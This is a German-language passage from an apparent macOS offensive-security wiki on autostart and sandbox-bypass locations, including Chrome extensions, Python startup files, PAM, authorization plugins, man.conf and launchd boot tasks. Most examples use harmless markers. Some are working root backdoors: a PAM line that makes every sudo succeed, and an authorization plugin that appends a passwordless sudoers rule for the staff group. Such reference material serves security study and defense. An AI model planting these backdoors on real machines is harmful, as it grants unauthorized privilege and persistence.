Dies sind zwei unterschiedliche Installationswege. Die [Dokumentation zur externen Installation von Chrome](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions) besagt, dass **Windows- und macOS-Benutzer eine über eine Datei für *External Extensions* angebotene Erweiterung bestätigen und aktivieren müssen**; sie wird nicht allein dadurch ausgeführt, dass diese JSON-Datei geschrieben wird. Für die Installation für alle Benutzer unter macOS muss Chrome außerdem sicherstellen, dass die Datei für externe Erweiterungen vor Änderungen durch nicht privilegierte Benutzer geschützt ist. Eine verwaltete Richtlinie `ExtensionInstallForcelist` oder `ExtensionSettings` kann eine Erweiterung ohne Interaktion des Benutzers installieren und anheften; [Googles Richtlinienleitfaden für Mac](https://support.google.com/chrome/a/answer/7517624) beschreibt die verwaltete Konfiguration und erklärt, dass Benutzer erzwungen installierte Erweiterungen nicht entfernen können. Dies ist ein Weg zur Bereitstellung über Richtlinien, keine Abkürzung per `defaults write` für einzelne Benutzer.<sup>[[49]](#references)</sup>

> [!WARNING]
> Unter macOS muss das *External Extensions*-JSON-Manifest auf eine **Chrome Web Store**-Update-URL verweisen, nicht auf eine lokale CRX-Datei. Die Bereitstellung per verwalteter Richtlinie hat eigene Unternehmensvoraussetzungen und kann eine verwaltete, selbst gehostete Update-URL zulassen. Für eine lokal entpackte Erweiterung in einem Testprofil ist der Chrome-Schalter `--load-extension=/path` im Entwicklermodus ein separater Mechanismus; dadurch wird eine JSON-Datei für External Extensions nicht selbst ausführend. Ein Schreibzugriff auf `Secure Preferences` ist nicht mit einem der beiden dokumentierten Registrierungswege gleichzusetzen.

```bash
# In a disposable browser account, propose a Chrome Web Store extension for enablement
ext_id='replace_with_32_character_web_store_id'
external_dir="$HOME/Library/Application Support/Google/Chrome/External Extensions"
mkdir -p "$external_dir"
cat > "$external_dir/$ext_id.json" <<'JSON'
{ "external_update_url": "https://clients2.google.com/service/update2/crx" }
JSON
```

Starte Chrome in diesem Wegwerfkonto und beobachte die Aktivierungsaufforderung; das Verhalten der Erweiterung selbst ist der Ausführungs-PoC, sobald der Benutzer zustimmt. Entferne nach dem Test das Manifest und deaktiviere/deinstalliere die Erweiterung in diesem Profil. Dieser Pfad wurde im aktiven Chrome-Profil auf dem Research-Mac **nicht** getestet. Der Weg über verwaltete Richtlinien wurde dort ebenfalls nicht eingesetzt.

Force-install und External Extensions referenzieren **Chrome Web Store**-Erweiterungs-IDs. Den Trick auf niedrigerer Ebene, eine lokale Erweiterung durch Bearbeiten der HMAC-signierten `Secure Preferences` des Profils unbemerkt einzuschleusen, sowie anderen Missbrauch von Chromium-Prozessen findest du hier:

{{#ref}}
macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md
{{#endref}}

### URL-Schema- und Dateityp-Handler (LaunchServices)

Bericht: [Remote Mac Exploitation Via Custom URL Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)<sup>[[52]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Auslöser ist, dass das Opfer auf einen Link klickt (z. B. in Chrome/Brave/Safari) oder eine Datei des registrierten Typs öffnet
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Die `Info.plist` eines App-Bundles, in der **`CFBundleURLTypes`/`CFBundleURLSchemes`** (benutzerdefiniertes URL-Schema) oder **`CFBundleDocumentTypes`** (Dateierweiterung/UTI) deklariert sind
- Effektive Standardwerte pro Benutzer können in **`~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`** (Array `LSHandlers`) erscheinen. Apples unterstützte API zum Festlegen eines URL-Schema-Standards ist `LSSetDefaultHandlerForURLScheme`; das direkte Schreiben in diese plist ist keine dokumentierte Registrierungs- oder Cache-Aktualisierungsmethode.

#### Beschreibung und Ausnutzung

Launch Services bezieht URL-Schema- und Dokumentzuordnungen aus der `Info.plist` einer registrierten App. In [Apples Registrierungsanleitung](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) heißt es, dass die Registrierung erfolgen kann, wenn Finder die App entdeckt, beim Start oder bei der Anmeldung oder über eine explizite Registrierungs-API; das bloße Ablegen einer App an einem beliebigen Ort löst nicht garantiert sofort eine Registrierung aus. Nach der Registrierung kann das Öffnen einer passenden URL oder eines passenden Dokuments die ausgewählte Handler-App starten, vorbehaltlich der Wahl des Standard-Handlers durch den Benutzer und der üblichen macOS-Startprüfungen. Die unterstützte API `LSSetDefaultHandlerForURLScheme` ändert den vom Benutzer bevorzugten URL-Handler; sie führt nicht dazu, dass eine neu abgelegte App automatisch ausgeführt wird.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Auf dem macOS-26.5.2-Recherche-Mac wurde keine App registriert und keine Handler-Präferenz geändert. Um einen tatsächlichen Handler zu testen, verwenden Sie ein entbehrliches Benutzerkonto, registrieren Sie eine App, die nur einen Marker setzt und ein eindeutiges Schema verwendet, rufen Sie ihre URL auf und entfernen Sie anschließend die App und ihre Registrierung.

Ausführliche Informationen zum Auflisten und Missbrauchen von Handlern für Dateierweiterungen und URL-Schemas finden Sie unter:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Python-Startdateien (`.pth` / `usercustomize` / `sitecustomize`)

Writeup: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Wird ausgeführt, wenn der entsprechende Python-Interpreter mit aktiviertem Site-Verzeichnis startet; der Trigger ist nicht für alle virtuellen Umgebungen, Python-Builds oder Start-Flags gleich
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)
  - Wird mit den Berechtigungen/TCC des Prozesses ausgeführt, der den Interpreter gestartet hat

#### Speicherort

- **`$(python3 -m site --user-site)/*.pth`** (macOS-Framework-Builds: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Kein Root erforderlich (vom Benutzer beschreibbar)
  - **Trigger**: Start dieses Python-Builds mit aktiviertem User-Site; das `site`-Modul verarbeitet `.pth`-Dateien in aktiven Site-Verzeichnissen
- **`<user-site>/usercustomize.py`**
  - Kein Root erforderlich
  - **Trigger**: Start mit aktiviertem User-Site (wird automatisch von `site` importiert)
- **`<prefix>/site-packages/sitecustomize.py`** (z. B. `/opt/homebrew/lib/python3.13/site-packages/` oder Systempfade)
  - Je nach Speicherort des Interpreters sind möglicherweise Root-/Admin-Rechte erforderlich
  - **Trigger**: Start eines Interpreters, der dieses Site-Verzeichnis einbindet

#### Beschreibung & Ausnutzung

Beim Start importiert Python normalerweise `site` und durchsucht seine aktiven `site-packages`-Verzeichnisse nach `.pth`-Dateien. Neben dem Hinzufügen von Pfaden führt eine `.pth`-Zeile, die mit `import ` beginnt, Python-Code aus, auch wenn das angegebene Modul sonst nie verwendet wird. Python versucht außerdem, `sitecustomize` und, **wenn das User-Site aktiviert ist**, `usercustomize` zu importieren.<sup>[[56]](#references)</sup> Der Trigger ist ein späterer Start eines Interpreters, der das geänderte Verzeichnis verwendet. `-S` deaktiviert die Verarbeitung durch `site`; `-s`, `-I` oder `PYTHONNOUSERSITE` deaktivieren die **User-Site**-Varianten. `-I` deaktiviert ein globales `sitecustomize` im Allgemeinen nicht. Virtuelle Umgebungen können das User-Site ebenfalls ausschließen. Prüfen Sie `python3 -m site` für den jeweiligen Interpreter.

Der folgende PoC wurde unter macOS 26.5.2 ausgeführt. `PYTHONUSERBASE` verschiebt für diesen Test das User-Site-Verzeichnis in ein temporäres Verzeichnis; das tatsächliche User-Site-Verzeichnis wird nicht verändert:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Beide Marker erschienen. Bei Wiederholung mit `-s`, `-I` oder `-S` wurden beide **user-site**-Marker in diesem Test verhindert. `sitecustomize` in einem globalen Site-Verzeichnis wurde nicht getestet.

## Root Sandbox Bypass

> [!TIP]
> Hier findest du Startorte, die für **sandbox bypass** nützlich sind und mit denen du etwas einfach ausführen kannst, indem du es **in eine Datei schreibst**, wobei du **root** bist und/oder andere **ungewöhnliche Bedingungen** erforderlich sind.

### Periodic

> [!CAUTION]
> **Historischer Mechanismus:** Auf der Testmaschine mit macOS 26.5.2 fehlen `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` und die `com.apple.periodic-*` launch daemons. Gehe nicht davon aus, dass das Erstellen von `/etc/periodic` auf einem aktuellen System dessen Inhalt ausführt. Prüfe die Zielversion, ob sowohl der Befehl als auch ein aktivierter Scheduler vorhanden sind, bevor du das folgende Beispiel verwendest.

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Nützlich für sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - root erforderlich
  - **Auslöser**: Wenn der Zeitpunkt gekommen ist
- `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local`
  - root erforderlich
  - **Auslöser**: Wenn der Zeitpunkt gekommen ist

#### Beschreibung & Exploitation

In älteren Versionen wurden die periodic-Skripte (**`/etc/periodic`**) von **launch daemons** in `/System/Library/LaunchDaemons/com.apple.periodic*` eingeplant. Ab macOS Big Sur 11.5 führte der periodic-Runner Skripte in den periodic-Verzeichnissen als **Eigentümer der jeweiligen Datei** aus und schloss damit einen früheren Privilege-Escalation-Pfad.<sup>[[27]](#references)</sup> Die folgenden Befehle und Verzeichnisauflistungen zeigen historische Ausgaben und sind kein Testergebnis für macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Weitere periodische Skripte, die ausgeführt werden, sind in **`/etc/defaults/periodic.conf`** angegeben:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Auf älteren Systemen, auf denen `periodic` und die zugehörigen Launch-Daemons installiert und aktiviert sind, waren `/etc/daily.local`, `/etc/weekly.local` und `/etc/monthly.local` zusätzliche Ausführungspfade. Eine harmlose, nur lesende Prüfung ist:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Die eigentümerbasierte Regel galt für Skripte, die sich direkt in den periodischen Verzeichnissen befanden. Der historische Wrapper `999.local` las früher `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local` ein, ohne dieselbe Eigentümerprüfung durchzuführen; wenn der Scheduler als root lief, wurden diese lokalen Dateien ebenfalls als root ausgeführt. Dieser Unterschied und die Änderung in Big Sur 11.5 sind in der [Originalrecherche](https://theevilbit.github.io/beyond/beyond_0019/) dokumentiert. Keiner dieser Pfade sollte als aktiv angenommen werden, wenn `periodic` fehlt.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du jedoch root sein
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- root ist immer erforderlich

#### Beschreibung & Ausnutzung

Da PAM eher auf Persistence und Malware ausgerichtet ist als auf die einfache Ausführung innerhalb von macOS, enthält dieser Blog keine ausführliche Erklärung. **Lies die Writeups, um diese Technik besser zu verstehen**.<sup>[[28]](#references)</sup>

Prüfe PAM-Module mit:

```bash
ls -l /etc/pam.d
```

Eine Persistenz-/Privilege-Escalation-Technik, die PAM missbraucht, ist so einfach wie das Ändern des Moduls `/etc/pam.d/sudo`, indem am Anfang die folgende Zeile hinzugefügt wird:

```bash
auth       sufficient     pam_permit.so
```

Es wird also **etwa** so aussehen:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

Und daher wird jeder Versuch, **`sudo` zu verwenden, funktionieren**.

> [!CAUTION]
> Beachte, dass dieses Verzeichnis durch TCC geschützt ist. Daher ist es sehr wahrscheinlich, dass der Benutzer aufgefordert wird, den Zugriff zu erlauben.

Ein weiteres gutes Beispiel ist `su`. Hier sieht man, dass es auch möglich ist, den PAM-Modulen Parameter zu übergeben (und man könnte auch diese Datei backdooren):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Du musst jedoch root sein und zusätzliche Konfigurationen vornehmen
- TCC-Bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
  - Root erforderlich
  - Außerdem muss die Authorization-Datenbank so konfiguriert werden, dass das Plugin verwendet wird

#### Description & Exploitation

Du kannst ein Authorization-Plugin erstellen, das ausgeführt wird, wenn sich ein Benutzer anmeldet, um Persistence aufrechtzuerhalten. Weitere Informationen zum Erstellen solcher Plugins findest du in den vorherigen Writeups (und sei vorsichtig: Ein schlecht geschriebenes Plugin kann dich aussperren, sodass du deinen Mac im Recovery-Modus bereinigen musst).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Verschieben** Sie das Bundle an den Speicherort, von dem es geladen werden soll:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Fügen Sie schließlich die **Regel** hinzu, um dieses Plugin zu laden:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** teilt dem Autorisierungsframework mit, dass es **einen externen Mechanismus zur Autorisierung aufrufen muss**. Außerdem bewirkt **`privileged`**, dass dieser als root ausgeführt wird.

Löse es aus mit:

```bash
security authorize com.asdf.asdf
```

Und dann sollte die **staff-Gruppe sudo**-Zugriff haben (lies `/etc/sudoers`, um dies zu bestätigen).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du jedoch root sein und der Benutzer muss man verwenden
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/private/etc/man.conf`**
  - Root erforderlich
  - **`/private/etc/man.conf`**: Wird verwendet, wann immer man ausgeführt wird

#### Beschreibung & Exploit

Die Konfigurationsdatei **`/private/etc/man.conf`** gibt an, welches Binary/Skript zum Öffnen von man-Dokumentationsdateien verwendet wird. Daher kann der Pfad zur ausführbaren Datei geändert werden, sodass jedes Mal, wenn der Benutzer man zum Lesen von Dokumentation verwendet, eine Backdoor ausgeführt wird.<sup>[[31]](#references)</sup>

Zum Beispiel in **`/private/etc/man.conf`** festlegen:

```
MANPAGER /tmp/view
```

Und erstellen Sie dann `/tmp/view` als:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du jedoch root sein und Apache muss laufen
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd hat keine Entitlements

#### Speicherort

- **`/etc/apache2/httpd.conf`**
  - Root erforderlich
  - Auslöser: Wenn Apache2 gestartet wird

#### Beschreibung & Exploit

Du kannst in `/etc/apache2/httpd.conf` angeben, dass ein Modul geladen werden soll, indem du eine Zeile wie diese hinzufügst:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Auf diese Weise wird dein kompiliertes Modul von Apache geladen. Du musst es lediglich entweder **mit einem gültigen Apple-Zertifikat signieren** oder **dem System ein neues vertrauenswürdiges Zertifikat hinzufügen** und es damit **signieren**.

Falls nötig, könntest du anschließend Folgendes ausführen, um sicherzustellen, dass der Server gestartet wird:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Codebeispiel für Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM-Audit-Framework

Write-up: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
  - Dafür musst du root sein, auditd muss laufen und eine Warnung auslösen
- TCC-bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/etc/security/audit_warn`**
  - Root erforderlich
  - **Auslöser**: Wenn auditd eine Warnung erkennt

#### Beschreibung & Exploit

Immer wenn auditd eine Warnung erkennt, wird das Skript **`/etc/security/audit_warn`** **ausgeführt**. Du könntest also deinen Payload hinzufügen.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

You could force a warning with `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Dies ist veraltet, daher sollte in diesen Verzeichnissen nichts gefunden werden.**

Das **StartupItem** ist ein Verzeichnis, das sich entweder unter `/Library/StartupItems/` oder `/System/Library/StartupItems/` befinden sollte. Sobald dieses Verzeichnis eingerichtet ist, muss es zwei bestimmte Dateien enthalten:

1. Ein **rc-Skript**: Ein Shell-Skript, das beim Start ausgeführt wird.
2. Eine **plist-Datei** mit dem Namen `StartupParameters.plist`, die verschiedene Konfigurationseinstellungen enthält.

Stelle sicher, dass sowohl das rc-Skript als auch die Datei `StartupParameters.plist` korrekt im Verzeichnis **StartupItem** abgelegt sind, damit der Startvorgang sie erkennt und verwendet.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ich kann diese Komponente auf meinem macOS-System nicht finden. Weitere Informationen findest du daher im Writeup.

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

**emond** wurde von Apple eingeführt und ist ein Protokollierungsmechanismus, der unterentwickelt oder möglicherweise aufgegeben zu sein scheint, aber weiterhin verfügbar ist. Dieser obskure Dienst ist für einen Mac-Administrator zwar nicht besonders nützlich, könnte Bedrohungsakteuren jedoch als unauffällige Persistenzmethode dienen, die den meisten macOS-Admins wahrscheinlich nicht auffällt.<sup>[[34]](#references)</sup>

Für diejenigen, die von seiner Existenz wissen, ist es einfach, eine böswillige Verwendung von **emond** zu erkennen. Der LaunchDaemon des Systems für diesen Dienst sucht in einem einzelnen Verzeichnis nach auszuführenden Skripten. Zur Überprüfung kann folgender Befehl verwendet werden:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Speicherort

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Root erforderlich
  - **Auslöser**: Mit XQuartz

#### Beschreibung & Exploit

XQuartz wird **nicht mehr in macOS installiert**. Weitere Informationen findest du im Writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Die Installation eines kext ist so kompliziert, selbst als Root, dass sie ohne Exploit nicht als praktikable Sandbox-Umgehungs- oder Persistenztechnik gilt.

#### Speicherort

Um ein KEXT als Autostartobjekt zu installieren, muss es **an einem der folgenden Speicherorte installiert werden**:

- `/System/Library/Extensions`
  - In das Betriebssystem OS X integrierte KEXT-Dateien.
- `/Library/Extensions`
  - Von Drittanbietersoftware installierte KEXT-Dateien

Du kannst die aktuell geladenen kext-Dateien mit folgendem Befehl auflisten:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Weitere Informationen zu [**Kernel-Erweiterungen finden Sie in diesem Abschnitt**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Speicherort

- **`/usr/local/bin/amstoold`**
  - Root erforderlich

#### Beschreibung & Ausnutzung

Offenbar verwendete die `plist` aus `/System/Library/LaunchAgents/com.apple.amstoold.plist` diese Binärdatei und stellte dabei einen XPC-Dienst bereit ... Der Haken war, dass die Binärdatei nicht existierte. Man konnte also etwas an dieser Stelle platzieren, und sobald der XPC-Dienst aufgerufen wurde, wurde die eigene Binärdatei ausgeführt.<sup>[[35]](#references)</sup>

Ich kann das in meinem macOS nicht mehr finden.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Speicherort

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Root erforderlich
  - **Auslöser**: Wenn der Dienst ausgeführt wird (selten)

#### Beschreibung & Ausnutzung

Offenbar wird dieses Skript nicht oft ausgeführt. Ich konnte es nicht einmal auf meinem macOS finden. Weitere Informationen finden Sie im Writeup.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Dies funktioniert in modernen macOS-Versionen nicht**

Es ist auch möglich, hier **Befehle abzulegen, die beim Start ausgeführt werden.** Beispiel für ein gewöhnliches rc.common-Skript:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd-Boot-Aufgaben

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle) (Root erforderlich)
- Root erforderlich sowie entweder ein **SIP bypass** oder die Berechtigung **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access, abhängig vom Pfad

#### Speicherort

`launchd` bettet in seinem Abschnitt **`__TEXT,__config`** eine plist ein, die frühe „Boot-Aufgaben“ beschreibt. Mehrere Referenzskripte/-binärdateien, die standardmäßig **nicht** vorhanden sind und von einem Angreifer erstellt werden können:

- SIP-bypass-Set: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA-Set: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` ist nur auf Sequoia+ bereits vorhanden)

#### Beschreibung und Ausnutzung

Gib die eingebettete Aufgabentabelle aus, um zu sehen, welche Dateien `launchd` ausführt und welche Schlüssel unterstützt werden (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Das Erstellen einer der referenzierten Dateien (z. B. `/etc/rc.server`) bewirkt, dass `launchd` sie beim nächsten Neustart im Userspace ausführt. Die nützlichsten Einträge sind durch SIP eingeschränkt oder erfordern TCC SysAdminFiles/Full Disk Access. Daher handelt es sich um eine Technik auf Root-Ebene, die einen Neustart auslöst.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

